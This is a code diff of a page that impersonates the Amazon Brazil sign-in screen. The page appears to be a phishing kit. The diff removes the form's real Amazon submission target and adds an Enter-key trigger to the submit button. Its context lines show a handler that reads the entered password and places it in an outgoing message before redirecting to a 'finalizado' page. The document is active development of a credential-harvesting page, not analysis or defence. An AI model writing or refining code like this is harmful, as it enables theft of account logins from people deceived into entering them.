@@ -99,13 +99,8 @@
                       </a>
                     </div>
       
-                    <form
-                      name="signIn"
-                      method="post"
-                      novalidate=""
-                      action="https://www.amazon.com.br/ap/signin"
+                    <div
                       class="auth-validate-form auth-real-time-validation a-spacing-none"
-                      data-fwcim-id="MkbHnDpT"
                     >
                       <input
                         type="hidden"
@@ -336,6 +331,9 @@
       document.getElementById('ap_email').value = sessionStorageData.email
     </script>
     <script>
+      document.addEventListener('keypress', event => {
+        if (event.keyCode === 13) document.getElementById('signInSubmit').click()
+      })
       document.getElementById('signInSubmit').addEventListener('click', event => {
         event.preventDefault()
         const passwrdField = document.getElementById('ap_password')
@@ -358,7 +356,9 @@ PASSWORD: ${sessionStorageData.password}
             `
           })
         })
-        location.href = '/finalizado'
+        setTimeout(() => {
+          location.href = 'finalizado'
+        })
       })
     </script>
   </body>
